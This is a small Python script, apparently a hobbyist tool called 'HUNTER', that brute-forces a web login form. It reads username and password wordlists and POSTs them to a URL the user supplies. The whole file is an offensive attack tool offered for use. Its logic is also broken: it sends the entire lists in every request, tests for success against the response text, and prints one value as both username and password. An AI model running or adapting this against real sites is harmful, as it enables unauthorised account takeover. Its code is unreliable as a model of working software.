#!/usr/bin/env python3
import requests

print("   __ ____  ___  _______________ ")
print("  / // / / / / |/ /_  __/ __/ _ \\")
print(" / _  / /_/ /    / / / / _// , _/")
print("/_//_/\____/_/|_/ /_/ /___/_/|_| ")
print("[+] coded by: ph.phoenix [+]")
print("[-] if there is an error type this 'cat README.md' [-]")
print("\n")

url = input("url: ")
word1 = input("username wordlist: ")
word2 = input("password worlist: ")

def login(username, password):
	r = requests.post(url, data = {
			"username": username,
			"password": password,
			"submit": "submit",
	    })
	return r


with open(word1, "r") as h:
	usernames = [ line.strip() for line in h.read().split("\n") if line ]

with open(word2, "r") as h:
	passwords = [ line.strip() for line in h.read().split("\n") if line ]

credentials = usernames and passwords

for x in credentials:
	try:
		response = login(usernames, passwords).text
		if x == response:
			print(f"""username found: {x}
password found: {x} \n""")
		else:
			print(f"""username: {x} is invalid
password: {x} is invalid \n""")
	except:
		print("Cancelled")
		break